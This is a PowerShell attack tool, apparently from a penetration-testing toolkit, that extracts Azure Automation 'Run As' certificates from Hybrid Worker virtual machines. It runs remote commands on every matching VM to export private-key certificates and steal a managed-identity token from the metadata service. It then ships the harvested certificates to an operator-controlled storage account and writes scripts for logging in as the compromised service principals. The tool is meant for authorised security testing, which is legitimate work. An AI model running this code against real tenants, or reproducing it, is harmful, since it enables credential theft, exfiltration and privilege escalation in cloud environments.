<#
    File: Invoke-AzHybridWorkerExtraction.ps1
    Author: Karl Fosaaen (@kfosaaen), NetSPI - 2023
    Description: PowerShell function for dumping Azure Automation Account Certificates from Hybrid Worker VMs using the Az PowerShell CMDlets.

    Potential Improvements:
        - Correct for multiple PFX files returned from hybrid worker
        - Add VM filter to specify VM to attack
        - Add Credential Gathering via JRDS
        - Add Runbook Gathering via JRDS
        - Migrate Auth As script creation to end of script to cover JRDS enumerated certs

#>


function Invoke-AzHybridWorkerExtraction{

<#

    .SYNOPSIS
        Dumps all available Automation Account certificates from Windows VMs with the Hybrid Worker extension in an Azure subscription. Use the resulting "AuthAs" ps1 scripts to make use of the extracted Run As credentials. Additional credentials from the JRDS service will be exported to a local .zip file.
    .DESCRIPTION
        This function will look for any VMs with the Hybrid Worker extension installed and will run a command to export any stored Run as certificates from the cert store.
    .PARAMETER Subscription
        Subscription to use.
    .EXAMPLE
        PS C:\MicroBurst> Invoke-AzHybridWorkerExtraction -StorageAccount TestStorage -StorageKey "myKEY123456==" -Verbose
        VERBOSE: Logged In as kfosaaen@notarealdomain.com
        VERBOSE: Getting a list of Hybrid Worker VMs
        VERBOSE: 	Running extraction script on the HWTest virtual machine
        VERBOSE: 		Looking for the attached App Registration... This may take a while in larger environments
        VERBOSE: 			Writing the AuthAs script
        VERBOSE: 		Use the C:\temp\HybridWorkers\AuthAsNetSPI_tester_[REDACTED].ps1 script to authenticate as the NetSPI_sQ[REDACTED]g= App Registration
        VERBOSE: 	Script Execution on HWTest Completed
        VERBOSE: Run as Credential Dumping Activities Have Completed

    .LINK
        https://www.netspi.com/blog/technical/cloud-penetration-testing/abusing-azure-hybrid-workers-for-privilege-escalation/
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Subscription to use.")]
        [string]$Subscription = "",
        [Parameter(Mandatory=$false,
        HelpMessage="Storage Account to use for JRDS data dumping.")]
        [string]$StorageAccount = "",
        [Parameter(Mandatory=$false,
        HelpMessage="Key to use with Storage Account.")]
        [string]$StorageKey = ""
    )

    # Check to see if we're logged in
    $LoginStatus = Get-AzContext
    $accountName = ($LoginStatus.Account).Id
    if ($LoginStatus.Account -eq $null){Write-Warning "No active login. Prompting for login." 
        try {Connect-AzAccount -ErrorAction Stop}
        catch{Write-Warning "Login process failed."}
        }
    else{}
    
    # Subscription name is technically required if one is not already set, list sub names if one is not provided "Get-AzSubscription"
    if ($Subscription){        
        Select-AzSubscription -SubscriptionName $Subscription | Out-Null
    }
    else{
        # List subscriptions, pipe out to gridview selection
        $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
        $subChoice = $Subscriptions | out-gridview -Title "Select One or More Subscriptions" -PassThru
        foreach ($sub in $subChoice) {Invoke-AzHybridWorkerExtraction -Subscription $sub -StorageAccount $StorageAccount -StorageKey $StorageKey}
        break
    }

    # Limit progress bar for the new Storage Account Container
    $OriginalProgressPreference = $Global:ProgressPreference
    $Global:ProgressPreference = 'SilentlyContinue'

    Write-Verbose "Logged In as $accountName"
    
    # JobName for extracting data from the VMs
    $jobName = (-join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})).ToLower()

    # Command to run on the VMs
    "`$mypwd = ConvertTo-SecureString -String ""TotallyNotaHardcodedPassword..."" -Force -AsPlainText;Get-ChildItem -Path cert:\localMachine\my\| ForEach-Object{ try{ Export-PfxCertificate -cert `$_.PSPath -FilePath (-join(`$_.PSChildName,'.pfx')) -Password `$mypwd | Out-Null;[Convert]::ToBase64String([IO.File]::ReadAllBytes((-join(`$PWD,'\',`$_.PSChildName,'.pfx'))));remove-item (-join(`$PWD,'\',`$_.PSChildName,'.pfx'))}catch{}}" | Out-File -FilePath ".\tempscript.ps1"

    if(($StorageAccount -ne "") -and ($StorageKey -ne "")){

        Write-Verbose "Using the $jobName container in the $StorageAccount Storage Account for temporary storage"

        # Temp Storage Account Setup
        $exfilContext = New-AzStorageContext -StorageAccountName $StorageAccount -StorageAccountKey $StorageKey
        $WriteSAStoken = New-AzStorageAccountSASToken -Service Blob -ResourceType Service,Container,Object -Permission "w" -ExpiryTime (Get-Date).AddDays(.02) -Context $exfilContext
        New-AzStorageContainer -Context $exfilContext -Name $jobName | Out-Null

        $uri = -join('https://',$StorageAccount,'.blob.core.windows.net/',$jobName,'/output.zip',$WriteSAStoken)
        $headers = @{"x-ms-blob-type" = "BlockBlob"}

        $invokeRequestString = "Invoke-WebRequest -Uri '$uri' -Headers @{`"x-ms-blob-type`"=`"BlockBlob`"} -Method Put -InFile '$jobName.zip' | Out-Null"

        # Second Command to run on the VMs
        "`$baseHKLM = ((Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\HybridRunbookWorkerV2)[0].Name).Split('\')[-1];`$regKey = (Get-ItemProperty -Path (-join('HKLM:\SOFTWARE\Microsoft\HybridRunbookWorkerV2\',`$baseHKLM,'\')));`$jrdsBase = (`$regKey| select JobRuntimeDataServiceUri).JobRuntimeDataServiceUri;`$resourceID = (`$regKey| select AzureResourceId).AzureResourceId;`$aaID = (`$jrdsBase.split('.')[0]).split('/')[2];`$jrdsURL = -join(`$jrdsBase, '/automationAccounts/',`$aaID,'/certificates/?api-version=1.0&vmResourceId=',`$resourceID);`$mgmtToken = ((Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Method GET -Headers @{Metadata=`"true`"} -UseBasicParsing).Content | ConvertFrom-Json).access_token;`$certList = (Invoke-WebRequest -Uri `$jrdsURL -Method GET -Headers @{Authorization=`"Bearer `$mgmtToken`"} -UseBasicParsing).Content| ConvertFrom-Json; `$certList.value | ForEach-Object {[IO.File]::WriteAllBytes(`"`$PWD\`$(`$_.name).pfx`",[Convert]::FromBase64String(`$_.value))};Compress-Archive -Path '.\*.pfx' -DestinationPath (-join('$jobname','.zip'));$invokeRequestString;rm (-join('$jobname','.zip'))" | Out-File -FilePath ".\tempscript2.ps1"
    }

    Write-Verbose "Getting a list of Hybrid Worker VMs"

    # Find the Windows VMs with the Hybrid Worker Extension
    Get-AzVM -status | Where-Object {(($_.StorageProfile.OSDisk.OSType -eq 'Windows')) -and ($_.PowerState -eq "VM running")} | Get-AzVMExtension | ForEach-Object {
        if($_.Name -eq "HybridWorkerExtension"){
    
            $vmName = $_.VMName
            Write-Verbose "`tStarting extraction on the $vmName virtual machine"
            Write-Verbose "`t`tRunning 'Run As' extraction script on the $vmName virtual machine"

            Try{

                $scriptOutput = Invoke-AzVMRunCommand -ResourceGroupName $_.ResourceGroupName -VMName $_.VMName -CommandId RunPowerShellScript -ScriptPath ".\tempscript.ps1" -ErrorAction SilentlyContinue
                $cmdOut = $scriptOutput.Value[0].Message

                if ($cmdOut.Length -gt 1){
                    [IO.File]::WriteAllBytes("$PWD\testCertificate.pfx",[Convert]::FromBase64String($cmdOut))

                    $mypwd = ConvertTo-SecureString -String "TotallyNotaHardcodedPassword..." -Force -AsPlainText
                    $pfxData = (Get-PfxData "$PWD\testCertificate.pfx" -Password $mypwd).EndEntityCertificates
                    $pfxSubject = $pfxData.Subject
                    $pfxThumb = $pfxData.Thumbprint
                    $newCert = (-join($pfxSubject.Split("=")[1],".pfx"))

                    
                    if((Get-ChildItem "$PWD\testCertificate.pfx").Length -gt 1){
                        Move-Item "$PWD\testCertificate.pfx" $newCert -Force
                    }
                    else{Remove-Item "$PWD\testCertificate.pfx"}

                    # Find the App ID by CertThumbprint
                    Write-Verbose "`t`t`tLooking for the attached App Registration... This may take a while in larger environments"

                    # Take each App Registration, get the available certs, match the thumbprints
                    Get-AzADApplication | ForEach-Object{
                        $appTempId = $_.AppId
                        $appTempName = $_.DisplayName
                        $_ | Get-AzADAppCredential | ForEach-Object{ if($_.CustomKeyIdentifier -EQ $pfxThumb){$appClientID = $appTempId; $appRegName = $appTempName}}
                    }

                    $tenantId = (get-azcontext).Tenant.Id

                    $outFile = (-join($pwd,'\AuthAs',$pfxSubject.Split("=")[1],".ps1"))

                    Write-Verbose "`t`t`t`tWriting the AuthAs script"

                    # Write the AuthenticateAs Script
                    "`$thumbprint = '$pfxThumb'" | Out-File $outFile
                    "`$tenantID = '$tenantId'" | Out-File -Append $outFile
                    "`$appId = '$appClientID'" | Out-File -Append $outFile
                    "`$mypwd = ConvertTo-SecureString -String ""TotallyNotaHardcodedPassword..."" -Force -AsPlainText" | Out-File -Append $outFile
                    "Import-PfxCertificate -FilePath $newCert -CertStoreLocation Cert:\LocalMachine\My -Password `$mypwd" | Out-File -Append $outFile
                    "Add-AzAccount -ServicePrincipal -Tenant `$tenantID -CertificateThumbprint `$thumbprint -ApplicationId `$appId" | Out-File -Append $outFile

                    Write-Verbose "`t`t`tUse the $outFile script to authenticate as the $appRegName App Registration"
                }
                else{Write-Verbose "`t`t`tNo Exportable Certificates on $vmName"}

                Write-Verbose "`t`tInitial Script Execution on $vmName Completed"
            }
            Catch{Write-Verbose "`t`t`tError in command excution. Check the Azure Activity Log for more details."}

            if(($StorageAccount -ne "") -and ($StorageKey -ne "")){
                Write-Verbose "`t`tRunning command for JRDS request to extract additional certificates"

                Try{
                
                    $scriptOutput = Invoke-AzVMRunCommand -ResourceGroupName $_.ResourceGroupName -VMName $_.VMName -CommandId RunPowerShellScript -ScriptPath ".\tempscript2.ps1" -ErrorAction SilentlyContinue

                    $ReadSAStoken = New-AzStorageAccountSASToken -Service Blob -ResourceType Service,Container,Object -Permission "r" -ExpiryTime (Get-Date).AddDays(.02) -Context $exfilContext
                    $uri = -join('https://',$StorageAccount,'.blob.core.windows.net/',$jobName,'/output.zip',$ReadSAStoken)

                    Invoke-WebRequest -Uri $uri -OutFile .\$vmName.zip -Verbose:$false | Out-Null
                    Write-Verbose "`t`t`tJRDS Extracted certificates are available locally in the $vmName.zip file."

                    Write-Verbose "`t`tSecondary Script Execution on $vmName Completed"
                }
                Catch{Write-Verbose "`t`t`tError in command excution. Check the Azure Activity Log for more details."}
            }
            else{Write-Verbose "`tNo Storage Account keys provided, skipping JRDS request to extract additional certificates"}
        }
    }

    if(($StorageAccount -ne "") -and ($StorageKey -ne "")){
        # Remove the Temporary Storage Account Container
        Remove-AzStorageContainer -Name $jobName -Context $exfilContext -Force | Out-Null
    }
    
    # Remove the temp scripts
    Remove-Item ".\tempscript.ps1"
    if(($StorageAccount -ne "") -and ($StorageKey -ne "")){
        Remove-Item ".\tempscript2.ps1"
    }

    # Reset Progress Bar Preference
    $Global:ProgressPreference = $OriginalProgressPreference

    Write-Verbose "Hybrid Worker Credential Dumping Activities Have Completed"

}
